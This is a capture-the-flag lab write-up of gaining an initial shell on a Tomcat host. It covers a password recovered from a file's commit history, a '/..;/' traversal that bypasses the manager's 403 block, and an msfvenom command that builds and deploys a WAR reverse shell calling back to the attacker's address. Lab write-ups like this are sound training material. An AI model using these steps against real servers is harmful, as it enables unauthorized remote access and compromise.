#  Getting Initial shell as tomcat
## Made account on gitbucket on http://10.10.10.250:8080/
![[Pasted image 20210928100501.png]]
## Logging in gitbucket as newly created user 'clarkey'
![[Pasted image 20210928100649.png]]
## http://10.10.10.250/manager/html giving 403 forbidden
http://10.10.10.250/manager/html giving 403 forbidden. We need to bypass 403 forbidden to access http://10.10.10.250/manager/html.
![[Pasted image 20210928100947.png]]
## http://10.10.10.250/manager/status is asking for password 
http://10.10.10.250/manager/status is asking for password which is found in tomcat-users.xml
![[Pasted image 20210928101336.png]]
## FInding  password in commit history of tomcat-users.xml
Found password in commit history of tomcat-users.xml.
![[Pasted image 20210928101714.png]]
## Using above password to access http://10.10.10.250/manager/status
![[Pasted image 20210928101940.png]]
## [exploit](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/)  arises when both nginx and tomcat are used 
[exploit] arisis (https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/) when both nginx and tomcat are used as it is evident from issue in root/seal_market repository.
![[Pasted image 20210928102322.png]]
## Accessing http://10.10.10.250/manager/html using [exploit](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/)
http://10.10.10.250/manager/html can be accessed using [exploit](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/). First we can access known url that works like http://10.10.10.250/manager/status then use directory traversal on this url to bypass 403 forbidden like http://10.10.10.250/manager/status/..;/html (`/..;/` is used to traverse tomcat resources/directories which includes `;`, not `/../` ) like below screenshot.
![[Pasted image 20210928103529.png]]
## using msfvenom to create `war` reverse shell
Using command `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.98 LPORT=1234 -f war -o sh.war` to get war reverse shell.
![[Pasted image 20210928103728.png]]
## uploading war file `sh.war` using burp suite repeater
![[Pasted image 20210928104229.png]]
![[Pasted image 20210928104539.png]]
## Getting initial shell as tomcat user via running war file on url https://10.10.10.250/sh/ 
Getting initial shell as tomcat user via running war file on url https://10.10.10.250/sh/ (where sh is name of war reverse shell).
![[Pasted image 20210928104900.png]]

